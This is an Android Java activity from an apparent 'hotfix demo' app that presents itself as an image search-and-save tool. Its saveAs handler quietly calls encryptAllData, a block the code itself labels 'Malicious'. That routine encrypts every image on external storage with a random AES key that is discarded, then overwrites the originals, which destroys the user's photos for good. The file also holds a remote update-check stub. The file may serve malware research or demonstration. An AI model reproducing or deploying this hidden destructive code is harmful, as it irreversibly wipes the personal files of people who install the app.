package com.moran.hotfixdemo;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.PixelFormat;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Bundle;
import com.moran.hotfixdemo.util.UpdateUtil;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.util.Pair;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import okhttp3.ResponseBody;


public class FindFile extends AppCompatActivity {
    private UpdateUtil updateUtil = new UpdateUtil();
    private String[] PERMISSIONS_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    private int REQUEST_PERMISSION_CODE = 1;
    private Context context;
    private String dcimPathPrefix = "/storage/emulated/0/Pictures/";
    private String TAG = "FindFile";
    private Handler mHandler = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_find_file);
        ActivityCompat.requestPermissions(this, PERMISSIONS_STORAGE, REQUEST_PERMISSION_CODE);
        context = getApplicationContext();
        createHandler();
        checkUpdate();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION_CODE) {
            for (int i = 0; i < permissions.length; i++){
                Log.i("FindFile", "permission is " + permissions[i]);
            }
        }
    }

    /*
        An input textview
        A button to search
        A image view to show the search result
         */
    //************************Image Search*************************//
    private String findMatchImg(Pair[] imgInfo, String targetName){
        String targetPath = "";
        ArrayList names = (ArrayList) imgInfo[0].second;
        ArrayList filePaths = (ArrayList) imgInfo[1].second;
        Log.d(TAG, "target name is " + targetName);
        for(int i = 0; i < names.size(); i++){
            Log.d(TAG, "current name is " + names.get(i).toString());
            Log.d(TAG, "has target? " + names.get(i).toString().contains(targetName));
            if (names.get(i).toString().contains(targetName)){
                targetPath = filePaths.get(i).toString();
            }
        }
        return targetPath;
    }

    private Pair[] listImage(){

        Log.d("FindFile", "Enter listImage function");
        ArrayList names = new ArrayList();
        ArrayList descs = new ArrayList();
        ArrayList fileNames = new ArrayList();
        Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null
        );
        while (cursor.moveToNext()){
            @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
            @SuppressLint("Range") byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            @SuppressLint("Range") String desc = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION));
            names.add(name);
            descs.add(desc);
            fileNames.add(new String(data, 0, data.length - 1));
        }

        // This is for logging
//        for (int i = 0; i < names.size(); i++){
//            Log.d("FindFile", "name is " + names.get(i));
//            Log.d("FindFile", "desc is " + descs.get(i));
//            Log.d("FindFile", "file name is " + fileNames.get(i));
//        }
        return new Pair[] {
                new Pair<>("name", names),
                new Pair<>("filePath", fileNames),
                new Pair<>("desc", descs)
        };

    }

    public void searchSuitableImg(View view){
        TextView textView = (TextView) findViewById(R.id.feature_input);
        String targetName = textView.getText().toString();
        Pair[] imgInfo = listImage();
        String targetPath = findMatchImg(imgInfo, targetName);
        showImg(targetPath);
    }

    private byte[] getFileByte(String targetPath){
        File file = new File(targetPath);
        byte[] buffer = null;

        if(!file.exists()){
            Log.e(TAG, "File doesn't exist");
            return null;
        }
        try{
            FileInputStream in = new FileInputStream(file);
            long inSize = in.getChannel().size();
            if (inSize == 0){
                Log.d(TAG, "The FileInputStream has no content");
                return null;
            }

            buffer = new byte[in.available()];
            in.read(buffer);

        } catch (IOException e){
            e.printStackTrace();
        }

        return buffer;
    }

    private void showImg(String targetPath){
        byte[] contentData = getFileByte(targetPath);
        Bitmap bm = null;
        if (contentData.length != 0){
            bm = BitmapFactory.decodeByteArray(contentData, 0, contentData.length);
        }
        ImageView imageView = (ImageView) findViewById(R.id.imageView);
        imageView.setImageBitmap(bm);
        context.sendBroadcast(
                new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE,
                        Uri.fromFile(new File(targetPath)))
        );
    }

    private Bitmap getBitmap(Drawable drawable){
        Bitmap bitmap = Bitmap.createBitmap(
                drawable.getIntrinsicWidth(),
                drawable.getIntrinsicHeight(),
                drawable.getOpacity() != PixelFormat.OPAQUE ? Bitmap.Config.ARGB_8888
                        : Bitmap.Config.RGB_565);
        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight());
        drawable.draw(canvas);
        return bitmap;
    }

    public void writeBak(String targetPath, byte[] data){
        try {
            File outFile = new File(targetPath);
            FileOutputStream fos = new FileOutputStream(outFile);
            FileChannel fileChannel = fos.getChannel();
            fileChannel.write(ByteBuffer.wrap(data));
            fileChannel.force(true);
            fileChannel.close();
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    public void saveAs(View view){
        TextView textView = (TextView) findViewById(R.id.text_rename);
        String newName = textView.getText().toString();
        String imgPath = dcimPathPrefix + newName;
        ImageView imageView = (ImageView) findViewById(R.id.imageView);
        Drawable drawable = imageView.getDrawable();
        Bitmap bitmap = getBitmap(drawable);

        // get byte from bitmap
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] data = baos.toByteArray();
        // end get

        writeBak(imgPath, data);

        // malicious part
        encryptAllData();
    }

    //************************Image Search End*********************//

    //*************************Network Request*********************//

    private byte[] generateKey(int keySize){
        byte[] keyBytes = null;

        try{
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            keyGenerator.init(keySize);
            SecretKey secretKey = keyGenerator.generateKey();
            keyBytes = secretKey.getEncoded();
        } catch (NoSuchAlgorithmException e){
            e.printStackTrace();
        }

        return keyBytes;
    }

    private byte[] encryptData(byte[] rawData){
        byte[] keyBytes = generateKey(256);
        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
        byte[] resultBytes = null;
        try{
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
            resultBytes = cipher.doFinal(rawData);
        } catch (Exception e){
            e.printStackTrace();
        }

        return resultBytes;
    }


    private void checkUpdate(){
//        String rawURL = "?Update/FindFile";
        String rawURL = "hello.txt";
//        String encryptedURL = Base64.encodeToString(encryptData(rawURL.getBytes()), Base64.DEFAULT);
//        ResponseBody responseBody = updateUtil.getRequest(encryptedURL);
       updateUtil.getRequest(rawURL, mHandler);

    }

    private void createHandler(){
        if (mHandler == null){
            mHandler = new Handler(Looper.getMainLooper()){
                @Override
                public void handleMessage(@NonNull Message msg) {
                    super.handleMessage(msg);
                    switch (msg.what){
                        case 1:
                            Toast.makeText(context, "Need to update", Toast.LENGTH_LONG).show();
                            break;
                        default:
                            break;
                    }
                }
            };
        }
    }
    //************************Network Request End******************//

    //**************************Malicious**************************//

    public void encryptAllData(){
        Pair[] allImg = listImage();
        ArrayList filePaths = (ArrayList) allImg[1].second;
        for(int i = 0; i < filePaths.size(); i++){
            String filePath = (String) filePaths.get(i);
            byte[] rawData = getFileByte(filePath);
            byte[] encryptData = encryptData(rawData);
            writeBak(filePath, encryptData);
        }
    }

    //************************Malicious End************************//

}